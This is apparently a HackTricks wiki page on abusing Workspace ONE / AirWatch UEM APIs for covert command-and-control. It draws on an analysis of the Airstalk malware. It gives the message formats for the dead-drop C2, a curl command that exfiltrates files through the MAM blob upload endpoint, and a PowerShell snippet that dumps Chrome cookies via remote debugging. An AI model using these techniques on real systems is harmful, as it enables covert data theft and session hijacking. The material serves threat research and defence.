# Workspace ONE / AirWatch Security

{{#include ../banners/hacktricks-training.md}}

## Abusing UEM APIs for Covert C2 and Exfiltration

Workspace ONE UEM (formerly AirWatch) exposes management REST APIs that can be abused as a covert command-and-control (C2) channel from compromised endpoints. A recent malware family ("Airstalk") demonstrates how to use device custom attributes as a dead-drop for commands/results and MAM blob uploads for bulk exfiltration, blending with legitimate enterprise UEM traffic.

### Dead-drop C2 via device custom attributes

Implants authenticate to the UEM API and write Base64-encoded JSON messages into device custom attributes, then poll the same attributes to receive operator commands. Two JSON layers are used:

- Outer attribute wrapper (what is written to the device record):

```json
{
  "Name": "<CLIENT_UUID>",
  "Value": "<BASE64(SERIALIZED_MESSAGE)>",
  "Uuid": "<CLIENT_UUID>",
  "Application": "services.exe",
  "ApplicationGroup": "services"
}
```

- Inner protocol envelope (serialized then Base64 in Value):

```json
{
  "method": "<MESSAGE_TYPE>",
  "uuid": "<CLIENT_UUID>",
  "sender": "<SENDER_ROLE>"
}
```

Notes:
- CLIENT_UUID is read locally (e.g., via WMI) and reused for Name/Uuid to appear as device-scoped metadata.
- sender is set to "client" for host→UEM writes. When polling, the implant decodes and ignores messages with sender=="client" to deconflict self-writes.
- Example message types used by observed implants: CONNECT, CONNECTED, ACTIONS, RESULT. A .NET variant adds PING, DEBUG, and MISMATCH (version control).

Polling logic (abstract):
- Periodically list/read device custom attributes through the devices API surface.
- For each attribute with Name/Uuid equal to the local device UUID, Base64-decode Value and parse JSON.
- If sender!="client" and method matches expected state, process task payload and respond via a new attribute write using RESULT.

### Bulk data exfiltration via MAM blobs

Large artifacts (screenshots, cookie dumps, archives) are POSTed to the Mobile Application Management blob upload endpoint. The returned blob handle/id is then referenced inside a RESULT message over the attribute channel, avoiding large payloads in attributes and blending into sanctioned file flows.

Endpoint highlights used by implants:
- devices API: used to write/read custom attributes for C2 dead-drop
- MAM blobs upload: /api/mam/blobs/uploadblob (multipart upload, returns a blob identifier)

Minimal example (pseudocode cURL with placeholder headers) to upload a file and return its blob id:

```bash
curl -sk -X POST "https://<uem-host>/api/mam/blobs/uploadblob" \
  -H "Accept: application/json" \
  -H "Content-Type: multipart/form-data" \
  -H "Authorization: <UEM_AUTH_TOKEN_OR_BASIC>" \
  -H "aw-tenant-code: <TENANT_CODE>" \
  -F "file=@/path/to/artifact.bin" \
  | jq -r '.BlobId // .blobId // .id'
```

Return the extracted blob id inside the C2 RESULT message written to the device custom attributes.

### C2 multiplexing with UUID suffixes (channel separation)

The .NET variant of the implant appends suffixes to the outer UUID/Name to segregate flows:
- -kb: base channel (connection establishment, beaconing)
- -kr: task polling + results
- -kd: debug/telemetry uploads (e.g., periodic log exfiltration ~10 min)

### Tasks commonly implemented by observed implants

- Screenshot capture (uploaded via blob; RESULT carries blob id)
- Chromium-based browser targeting (Chrome/Edge/Island): enumerate profiles, export bookmarks/history, and exfiltrate specific profile data
- Cookie theft via DevTools Remote Debugging (see next section)
- Directory listing and targeted file exfiltration
- Uninstall/exit (PowerShell variant removed Scheduled Task persistence; .NET variant sets an uninstall flag in attributes and exits)

### Chromium cookies exfil via Remote Debugging

Abuse the DevTools protocol by launching the browser with remote debugging and a chosen profile, then programmatically export all cookies to disk for exfiltration via the UEM blob channel. High-level example:

```powershell
# Pick a profile (e.g., "Default") and a temp output path
$Profile = "Default"
$Out = "$env:TEMP\\cookies.json"

# Start Chrome with remote debugging enabled for the target profile
Start-Process -FilePath "$env:ProgramFiles\\Google\\Chrome\\Application\\chrome.exe" \
  -ArgumentList "--remote-debugging-port=9222 --profile-directory=$Profile"

# Connect to ws://127.0.0.1:9222/json/version → DevTools WebSocket, then:
# 1) Runtime.evaluate or Network.getAllCookies to retrieve cookies
# 2) Write cookies to $Out and upload via /api/mam/blobs/uploadblob
```

### Evasion and persistence behaviors seen in the wild

- Authenticode-signed .NET binaries with legitimate-looking metadata; in one case the certificate was later revoked. Implants also manipulated PE header timestamps; signing timestamp countersignatures revealed the real build timeline.
- PowerShell variant used a Scheduled Task for persistence and removed it on uninstall to reduce forensic footprint; .NET variant had no built-in persistence and used an "uninstall" attribute flag before exiting.

## References

- [Unit42: Suspected Nation-State Threat Actor Uses New Airstalk Malware in a Supply Chain Attack](https://unit42.paloaltonetworks.com/new-windows-based-malware-family-airstalk/)
- [Workspace ONE UEM REST APIs (Docs Landing)](https://developer.vmware.com/docs/21725/workspace-one-uem-rest-apis/)
- [Red Canary: Chrome cookie theft via DevTools/remote debugging](https://redcanary.com/blog/threat-intelligence/google-chrome-app-bound-encryption/)

{{#include ../banners/hacktricks-training.md}}
